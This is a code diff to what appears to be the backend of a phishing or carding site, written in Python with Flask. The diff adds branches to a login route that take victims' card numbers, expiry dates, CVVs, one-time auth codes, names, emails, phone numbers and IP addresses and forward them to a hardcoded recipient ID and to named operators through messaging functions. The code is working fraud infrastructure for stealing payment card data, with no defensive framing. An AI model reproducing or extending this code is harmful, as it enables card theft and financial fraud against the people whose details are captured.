@@ -206,9 +206,29 @@ def login():
             ne_pizdabol(card_number)
             send_buttons_message(cc_otp, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
-
+        
+        elif id == '10000018':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(dch3, card_number, expiry_date, cvv, authCode, ID, ip_address)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(dch3, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
+        
+        elif id == '10000019':
+            send_me('7383961273', card_number, expiry_date, cvv, ID, ip_address)
+            if authCode is not None and authCode != 'None':
+                send_sms(joe, card_number, expiry_date, cvv, authCode, ID, ip_address)
+                return '', 200  # Возвращаем пустой ответ с кодом 200
+            ne_pizdabol(card_number)
+            send_buttons_message(joe, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            return '', 200  # Возвращаем пустой ответ с кодом 200
         return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
 
+    
+
+        
 
 @app.route('/test', methods=['GET'])
 def test():
@@ -221,5 +241,4 @@ def test2():
     result = str(get_button_by_id(user_id_to_check, database))
     return jsonify({'result': result})
 if __name__ == '__main__':
-    app.run(debug=True)
-    
+    app.run(debug=True)    
